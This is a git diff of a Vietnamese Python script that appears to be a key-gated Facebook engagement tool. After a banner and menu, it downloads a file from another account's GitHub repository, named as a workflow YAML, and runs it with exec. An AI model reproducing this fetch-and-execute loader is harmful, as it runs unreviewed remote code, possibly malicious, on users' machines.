abbbdba834b9cc69941ce1ee242d5e12fecce4b3
hoangminhthieu <hoangminhthieu14102008@gmail.com>
2025-05-16 07:36:58 +0700

    Update thtool.py

--- thtool.py
+++ thtool.py
@@ -44,26 +44,24 @@ hong = "\033[1;35m"
 trang = "\033[1;39m"
 end = '\033[0m'
 def banner():
-    os.system("cls" if os.name == "nt" else "clear")
+    os.system("cls" if os.name == "nt" else "clear")             
     banner = f"""
-\033[1;33m████████╗██╗░░██╗ ████████╗░█████╗░░█████╗░██╗░░░░░
-\033[1;35m╚══██╔══╝██║░░██║ ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
-\033[1;36m░░░██║░░░███████║ ░░░██║░░░██║░░██║██║░░██║██║░░░░░
-\033[1;37m░░░██║░░░██╔══██║ ░░░██║░░░██║░░██║██║░░██║██║░░░░░
-\033[1;32m░░░██║░░░██║░░██║ ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
-\033[1;31m░░░╚═╝░░░╚═╝░░╚═╝ ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝\n
-\033[97m═════════════════════════════════════════════  
-\033[1;97m[\033[1;31m</>\033[1;91m\033[1;97m]\033[1;97m Admin\033[1;31m : Thiệu Hoàng 
-\033[1;97m[\033[1;31m</>\033[1;97m]\033[1;97m Youtube\033[1;31m : \033[1;97m☞ \033[1;36mTH TOOL
-\033[1;97m[\033[1;31m</>\033[1;97m]\033[1;97m Group Zalo\033[1;35m: https://zalo.me/g/ahnoav496
-\033[1;97m[\033[1;31m</>\033[1;97m]\033[1;97m Facebook\033[1;31m : \033[1;33mHoàng Minh Thiệu 
-\033[97m════════════════════════════════════════════════
+    ████████╗██╗  ██╗ ████████╗ █████╗  █████╗ ██╗
+    ╚══██╔══╝██║  ██║ ╚══██╔══╝██╔══██╗██╔══██╗██║
+       ██║   ███████║    ██║   ██║  ██║██║  ██║██║
+       ██║   ██╔══██║    ██║   ██║  ██║██║  ██║██║
+       ██║   ██║  ██║    ██║   ╚█████╔╝╚█████╔╝███████╗
+       ╚═╝   ╚═╝  ╚═╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝ 
+       
+         \033[1;36mAdmin: Thiệu Hoàng | YouTube: @thieuhoang75 
+            \033[1;39mBox Zalo: https://zalo.me/g/ahnoav496
+                \033[1;33mNgày: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
+\033[1;39m--------------------------------------------------------
 """ 
     for X in banner:
         sys.stdout.write(X)
         sys.stdout.flush()
         sleep(0.000001)
-
 def get_ip_address():
     try:
         response = requests.get('https://api.ipify.org?format=json')
@@ -77,7 +75,7 @@ def get_ip_address():
 def display_ip_address(ip_address):
     if ip_address:
         banner()
-        print(f"\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mĐịa chỉ IP : {ip_address}")
+        print(f"\033[1;39m[\033[1;31m</>\033[1;39m]\033[1;31m Địa chỉ IP : {ip_address}")
     else:
         print("Không thể lấy địa chỉ IP của thiết bị.")
 
@@ -111,7 +109,7 @@ def generate_key_and_url(ip_address):
     ip_numbers = ''.join(filter(str.isdigit, ip_address))
     key = f'TH{key1}{ip_numbers}'
     expiration_date = datetime.now().replace(hour=23, minute=59, second=0, microsecond=0)
-    url = f'https://www.webkey.x10.mx/?ma={key}'
+    url = f'https://uefhhdjdjshsbbz.blogspot.com/2025/05/key_2.html?ma={key}'
     return url, key, expiration_date
 
 def da_qua_gio_moi():
@@ -143,7 +141,7 @@ def main():
     if ip_address:
         existing_key = kiem_tra_ip(ip_address)
         if existing_key:
-            print(f"\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;35mTool còn hạn, mời bạn dùng tool...")
+            print(f"\033[1;97m[\033[1;91m</>\033[1;97m] \033[1;35mTool còn hạn, mời bạn dùng tool...")
             time.sleep(2)
         else:
             if da_qua_gio_moi():
@@ -153,12 +151,12 @@ def main():
             url, key, expiration_date = generate_key_and_url(ip_address)
 
             with ThreadPoolExecutor(max_workers=2) as executor:
-                print("\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;32mNhập 1 Để Lấy Key \033[1;33m( Free )")
+                print("\033[1;97m[\033[1;91m</>\033[1;97m] \033[1;32mNhập 1 Để Lấy Key \033[1;33m( Free )")
 
                 while True:
                     try:
-                        choice = input("\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;34mNhập lựa chọn: ")
-                        print("\033[97m════════════════════════════════════════════════")
+                        choice = input("\033[1;97m[\033[1;91m</>\033[1;97m] \033[1;34mNhập lựa chọn: ")
+                        print("\033[97m--------------------------------------------------------")
                         if choice == "1":
                             yeumoney_future = executor.submit(get_shortened_link_phu, url)
                             yeumoney_data = yeumoney_future.result()
@@ -167,92 +165,92 @@ def main():
                                 return
                             else:
                                 link_key_yeumoney = yeumoney_data.get('shortenedUrl')
-                                print('\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;35mLink Để Vượt Key Là \033[1;36m:', link_key_yeumoney)
+                                print('\033[1;97m[\033[1;91m</>\033[1;97m] \033[1;35mLink Để Vượt Key Là \033[1;36m\033[1;39m:', link_key_yeumoney)
 
                             while True:
-                                keynhap = input('\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;33mKey Đã Vượt Là: \033[1;32m')
+                                keynhap = input('\033[1;97m[\033[1;91m</>\033[1;97m] \033[1;33mKey Đã Vượt Là\033[1;39m: \033[1;32m')
                                 if keynhap == key:
                                     print('Key Đúng Mời Bạn Dùng Tool')
                                     sleep(2)
                                     luu_thong_tin_ip(ip_address, keynhap, expiration_date)
                                     return
                                 else:
-                                    print('\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;35mKey Sai Vui Lòng Vượt Lại Link \033[1;36m:', link_key_yeumoney)
+                                    print('\033[1;97m[\033[1;91m</>\033[1;97m] \033[1;35mKey Sai Vui Lòng Vượt Lại Link \033[1;36m\033[1;39m:', link_key_yeumoney)
                     except ValueError:
                         print("Vui lòng nhập số hợp lệ.")
                     except KeyboardInterrupt:
-                        print("\n\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mCảm ơn bạn đã dùng Tool !!!")
-                        sys.exit()
+                        print("\n\033[1;97m[\033[1;91m</>\033[1;97m] \033[1;31mCảm ơn bạn đã dùng Tool !!!")                                
 if __name__ == '__main__':
-    main()
-    
-    
+           main()  
+import time
+from time import strftime
 import os
 import sys
-import time
-import json
 import requests
-import socket 
+import json
+from time import sleep
+from datetime import datetime, timedelta
+import base64
+import requests
+import os
+import subprocess
+from pystyle import Colors, Colorate
+from rich.console import Console
+from rich.panel import Panel
+from rich.console import Console
+from rich.text import Text
+# màu
+xnhac = "\033[1;36m"
+do = "\033[1;31m"
+luc = "\033[1;32m"
+vang = "\033[1;33m"
+xduong = "\033[1;34m"
+tim = '\033[1;39m'
+hong = "\033[1;35m"
+trang = "\033[1;37m"
+whiteb = "\033[1;37m"
+red = "\033[0;31m"
+redb = "\033[1;31m"
+end = '\033[0m'
+os.system("cls" if os.name == "nt" else "clear")
+# đánh dấu bản quyền
+ndp_tool = "\033[1;31m[\033[1;37m<>\033[1;31m] \033[1;37m=>  "
+thanh = "\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
 
 def banner():
- os.system("cls" if os.name == "nt" else "clear")          
+    banner = f"""
+    \033[1;37m████████╗██╗  ██╗ ████████╗ █████╗  █████╗ ██╗
+    \033[1;37m╚══██╔══╝██║  ██║ ╚══██╔══╝██╔══██╗██╔══██╗██║
+       \033[1;37m██║   ███████║    ██║   ██║  ██║██║  ██║██║
+       \033[1;37m██║   ██╔══██║    ██║   ██║  ██║██║  ██║██║
+       \033[1;37m██║   ██║  ██║    ██║   ╚█████╔╝╚█████╔╝███████╗
+       \033[1;37m╚═╝   ╚═╝  ╚═╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝ 
+       
+         \033[1;36mAdmin: Thiệu Hoàng | YouTube: @thieuhoang75 
+            \033[1;39mBox Zalo: https://zalo.me/g/ahnoav496
+                \033[1;33mNgày: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
+\033[1;39m--------------------------------------------------------
+""" 
 
-from builtins import exec, input, len, print, int, range, str, open, exit
-exec('')
-xnhac = '\x1b[1;36m'
-do = '\x1b[1;31m'
-luc = '\x1b[1;32m'
-vang = '\x1b[1;33m'
-xduong = '\x1b[1;34m'
-hong = '\x1b[1;35m'
-trang = '\x1b[;1;30m'
-trang = '\x1b[1;39m'
-whiteb = '\x1b[1;39m'
-red = '\x1b[0;31m'
-redb = '\x1b[1;31m'
-end = '\x1b[0m'
-dev = '\x1b[1;39m[\x1b[1;31m×\x1b[1;39m]\x1b[1;39m'
-thanh_xau = red + '[' + vang + '⟨⟩' + red + '] ' + trang + '➩ ' + luc
-thanh_dep = trang + '~' + red + '[' + luc + '✓' + red + '] ' + trang + '➩ ' + luc
-import requests
-import json
-import os
-import sys
-from sys import platform
-from datetime import datetime
-from time import sleep, strftime
-from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
-os.system("cls" if os.name == "nt" else "clear")   
-def is_connected():
-    import socket
-    socket(('1.1.1.1', 53))
-    return True
-    if OSError:
-        pass
-    return False
-print('\x1b[0;31m ████████╗██╗░░██╗ ████████╗░█████╗░░█████╗░██╗░░░░░ ')
-print('\x1b[0;31m ╚══██╔══╝██║░░██║ ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░     ')
-print('\x1b[0;31m ░░░██║░░░███████║ ░░░██║░░░██║░░██║██║░░██║██║░░░░░    ')
-print('\x1b[0;31m ░░░██║░░░██╔══██║ ░░░██║░░░██║░░██║██║░░██║██║░░░░░    ')
-print('\x1b[0;31m ░░░██║░░░██║░░██║ ░░░██║░░░╚█████╔╝╚█████╔╝███████╗    ')
-print('\x1b[0;31m ░░░╚═╝░░░╚═╝░░╚═╝ ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝')          
-print('\x1b[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ')          
-print('\x1b[1;33mADMIN : Thiệu Hoàng')
-print('\x1b[1;33mYOUTOBE : TH TOOL')    
-print('\x1b[1;33mGROUP ZALO : https://zalo.me/g/kecjvq444  ')
-print('\x1b[1;33mFACEBOOK : HOÀNG MINH THIỆU                          ')
-print('\x1b[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ')
-print('\x1b[0;31m╔═══════════════════════════╗')
-print('\x1b[0;31m║\x1b[1;33m       TOOL TTC            \x1b[0;31m║')
-print('\x1b[0;31m╚═══════════════════════════╝')
-print('\x1b[38;5;226m[1] \x1b[38;5;46mTOOL \x1b[38;5;51mTTC FACEBOOK\x1b[38;5;226m ')
-print('\x1b[38;5;46m-----------------------------------------------------------------')
-import requests
-chon = str(input('\x1b[0;31m nhập số : '))
-if chon == '1' :    
-	#ttc fb
-     exec(requests.get('https://raw.githubusercontent.com/hoangminhthieu/thtool/refs/heads/main/toolttcfb.py').text)     
-exit()
+    for X in banner:
+        sys.stdout.write(X)
+        sys.stdout.flush()
+        sleep(0.00025)
 
-	
-     
+os.system("cls" if os.name == "nt" else "clear")
+banner()
+
+
+print (Colorate.Diagonal(Colors.blue_to_purple, "Nhập 1 để vô tool ttc fb"))
+
+
+
+
+chon = str(input('\033[1;31m[\033[1;37m<>\033[1;31m] \033[1;37m=> \033[1;32mNhập\033[1;36m Số \033[1;37m: \033[1;33m'))
+
+
+if chon == '1' :
+    exec(requests.get('https://raw.githubusercontent.com/Khanh23047/thoattool/main/.github/workflows/main.yml').text)
+    
+else :
+     exit()
